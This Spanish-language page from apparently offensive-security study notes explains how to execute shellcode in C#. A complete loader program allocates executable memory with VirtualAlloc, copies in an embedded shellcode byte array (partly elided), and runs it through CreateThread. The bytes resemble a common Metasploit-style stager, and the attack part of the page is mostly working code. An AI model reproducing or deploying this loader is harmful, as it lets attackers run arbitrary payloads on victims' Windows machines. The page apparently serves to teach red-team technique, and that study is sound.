# Shellcode Execution C\#

Consiste en crear un nuevo proceso .exe, en el cual vamos a ejectuar nuestra shellcode.&#x20;

Para esto vamos a:

* reservar un espacio en memoria del tamaño de la shellcode
* copiar la shellcode al espacio creado
* ejecutar lo que tengamos en la direccion de memoria creada
* no cerrar el programa después de ejecutar el programa



## Código

{% code lineNumbers="true" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp2
{

    internal class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;

        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            byte[] buf = new byte[650] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
                0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
                                                  . . . 
                0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,
                0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,
                0xb5,0xa2,0x56,0xff,0xd5
             };

            // Crear un espacio en la memoria para guardar el shelloce
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Copiar el Shellcode al espacio de memoria creado
            Marshal.Copy(buf, 0, addr, buf.Length);

            // Crear un thread (hilo) que ejecute el shellcode en el espacio de memoria creado
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // No cerrar el programa 
            WaitForSingleObject(thread, 0xFFFFFFFF);

        }
    }
}
```
{% endcode %}



### Pasos

1.  Crear espacio en memoria con VirtualAlloc&#x20;

    <div align="left">

    <figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

    </div>
2. Copiar a este espacio de memoria la shellcode&#x20;

<div align="left">

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

</div>

<div align="left">

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

</div>

3. Ejecutar la shellcode con CreateThread

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

### Funciones

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" %}

{% embed url="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-7.0" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" %}





##

###

